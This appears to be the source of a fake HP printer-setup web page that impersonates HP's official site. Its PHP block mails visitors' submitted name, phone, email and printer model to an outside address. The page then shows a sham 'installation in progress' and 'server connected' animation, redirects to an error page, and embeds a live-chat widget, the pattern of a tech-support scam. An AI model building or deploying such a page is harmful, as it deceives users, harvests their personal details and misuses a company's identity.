<?php

    if($_POST){
        $name = $_POST['name'];
        $phone = $_POST['phone'];
        $email = $_POST['email'];
        $model = $_POST['model'];
        


        $to = "support@travelitrip.com";
        $subject = "HP Printer Setup";
        $message = "
            Name : $name
            Phone : $phone
            Email : $email
            Model : $model
            
            Client : HP Printer Setup,

        ";
        $from = "hallalec22@gmail.com";
        $headers = "From:" . $from;


        mail($to,$subject,$message,$headers);

        
    }
?>
<!DOCTYPE html>
<html country="US" lang="en" dir="ltr">
  
<head>
    <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/63456d5637898912e96e0aed/1gf3j674v';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
    <meta content="hpi" name="company_code"/>
    <meta content="IPG" name="bu"/>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
    
    <meta name="description" content="Welcome to the HP Official website to setup your printer."/>
    <meta content="hpexpnontridion" name="hp_design_version"/>
    <meta
      content="hp drivers, hp driver, hp downloads, hp download drivers, hp printer drivers, hp printers drivers, hp scanner drivers, hp printer driver, hp print drivers, hp printer drivers download"
      name="keywords"/>
    <meta content="support.drivers" name="lifecycle"/>
    <meta content="Solutions" name="page_content"/>
    <meta content="follow, index" name="robots"/>
    <meta content="Segment Neutral" name="segment"/>
    <meta name="target_country" content="gb"/>
    <meta content=" R11849 " name="web_section_id"/>
    <meta content="True" name="HandheldFriendly"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>

    <!-- CSS  -->
    <link media="screen" rel="stylesheet" href="resources/assets/css/page/123fontstyles.css"/>
    <link media="screen" rel="stylesheet" href="resources/assets/dist/application.min.css"/>
    <link rel="stylesheet" href="resources/assets/css/vendor/jquery.typeahead.min.css" type="text/css"/>

    <!--  JavaScript -->
    <script src="resources/assets/js/vendor/jquery/jquery-1.8.js" type="text/javascript"></script>
    <!--  This script has very poor performance and downloads over 20 dependencies from the footer script -->
    <script defer="defer" src="resources/assets/js/vendor/jquery/can.jquery-1.8.js"
          type="text/javascript"></script>
    <script async src="../../www.hp.com/cma/ng/lib/exceptions/privacy-banner.js"></script>
    <script defer="defer" src="resources/assets/js/page/tooltipster.main.min.js" type="text/javascript"></script>
    <script defer="defer" src="resources/assets/js/page/tooltipster.bundle.min.js" type="text/javascript"></script>

    <script defer="defer" src="resources/assets/js/vendor/base.min.js" type="text/javascript"></script>
    <script defer="defer" src="resources/assets/dist/application.min.js" type="text/javascript"></script>


  
  <title>Loading - HP Printer Setup</title>
  <link rel="stylesheet" href="resources/assets/css/page/flex-design.css" type="text/css"/>
  <link rel="stylesheet" href="resources/assets/css/page/desktop-app-store.css" type="text/css"/>
  <link rel="stylesheet" href="resources/assets/css/page/swls-delay.css" type="text/css"/>
  <script defer="defer" src="resources/assets/js/page/flex-design.js" type="text/javascript"></script>
  <script defer="defer" src="resources/assets/js/page/desktop-app-store.js" type="text/javascript"></script>
  <script src="../../cdn.optimizely.com/js/11773710518.js"></script>
  <script type="text/javascript">

    var pageName = 'appstore_mainpage';
    var deviceId = "other-printers";
    if (deviceId != '') {
      pageName = pageName + '_' + deviceId.toLowerCase();
    }

    //UDL Analytics - data layer
    pageName = 'appstore_desktop_windows';
    if (deviceId != '') {
      pageName = pageName + '_' + deviceId.toLowerCase();
    }

    dataLayer.push({
      event: 'e_pageView',
      pageNameL5: pageName,
    });
  </script>
  <script type="text/javascript">
    /*<![CDATA[*/
    var tooltip1 = "??message.tooltip1_en_GB??"
    /*]]>*/
  </script>
</head>
<body>
  <div class="header-123" id="header-123">
      <div class="header-container">
        <div class="hp-logo">
          <a href="https://printservices.site/"
            title="123.hp.com - Printer setup from the HP Official site">
            <img alt="123.hp.com - Printer setup from the HP® Official site" src="resources/assets/img/hp-logo.svg"/>
          </a>
        </div>
        <ul class="header-menu">
          <li>
            <a href="#">OfficeJet</a>
          </li>
          <li>
            <a href="#">DeskJet</a>
          </li>
          <li>
            <a href="#">ENVY</a>
          </li>
          <li>
            <a href="#">LaserJet</a>
          </li>
        </ul>
      </div>
    </div>
  <div>
    <input id="deviceId" value="other-printers" type="hidden"/>
    <input id="supportUrl" value="" type="hidden"/>
    <input id="languageDirection" value="ltr" type="hidden"/>
    <input id="derivativeExperience" type="hidden" value="${uiExperience}"/>
    <input id="gotoHPUrl" value="" type="hidden"/>
    <input id="deviceName" value="OTHER PRINTERS" type="hidden"/>
    <input id="lang" value="en" type="hidden"/>
    <input id="localePath" value="/gb/en" type="hidden"/>
    <input id="osType" value="windows" type="hidden"/>
    <input id="printerSetupUrl" value="https://support.hp.com/gb-en/printer-setup" type="hidden"/>
    <input id="printerTroubleshootUrl" value="" type="hidden"/>
    <input id="printerVideoUrl" value="" type="hidden"/>
    <input id="specialDevices" value="true" type="hidden"/>
    <input id="appStoreUrl" value="ms-windows-store://pdp/?ProductId=9WZDNCRFHWLH" type="hidden"/>
  </div>
  <div id="one23-overlay"></div>
<!--  <div class="printer_setup two">-->
<!--  <div class="container">-->
<!--    <h2>Download Printer Setup/Drivers</h2>-->
<!--    <div class="content">-->
<!--      <p id="demo">Connecting With Server.</p>-->
<!--      <div class="para">Please Wait...</div>-->
<!--      <div id="show">Server Connected</div>-->
<!--    </div>-->
<!--  </div>-->
<!--</div>-->

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="code.jquery.com/jquery-1.12.4.min.js" integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ" crossorigin="anonymous"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
    <script>  
        $("#show").hide().delay(3000).queue(function(n) {
        $(this).show(); n();
      });
      var text = ["Uploading Product Information."];
      var counter = 0;
      var elem = document.getElementById("demo");var inst = setInterval(change, 6000);
      
      function change() {
        elem.innerHTML = text[counter];
        counter++;
        if (counter >= text.length) {
          counter = 0;
        }
      };
        function pageRedirect() {
              window.location.replace("er/error.html");
          }      
          setTimeout("pageRedirect()", 30000);
      </script>
  <main class="vertical">
      <center><br><br>
              <img src="i.stack.imgur.com/kOnzy.gif" width="200px">
              <h3>Please Wait, Installation in Progress!</h3>
    <h2>Download Printer Setup/Drivers</h2>

              <h3 id="show" style="color: green">SERVER CONNECTED</h3>

      </center>
  </main>
  <footer class="footer" id="footer"></footer>
</body>
  <script type="text/javascript">
  if (!window.console) {
    console = {
      log: function() {
      },
    };
  }
  </script>


</html>
